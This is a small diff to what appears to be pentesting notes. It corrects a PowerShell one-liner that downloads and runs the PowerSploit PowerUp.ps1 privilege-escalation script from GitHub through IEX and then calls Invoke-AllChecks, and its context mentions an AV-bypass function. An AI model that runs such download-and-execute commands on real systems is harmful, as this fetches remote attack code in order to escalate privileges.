@@ -9,6 +9,6 @@ IEX($content);Invoke-AlokS-AvBypass
 
 
 ```
-IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1;Invoke-AllChecks')
+IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks | Format-Table
 powershell get-item function:
 ```
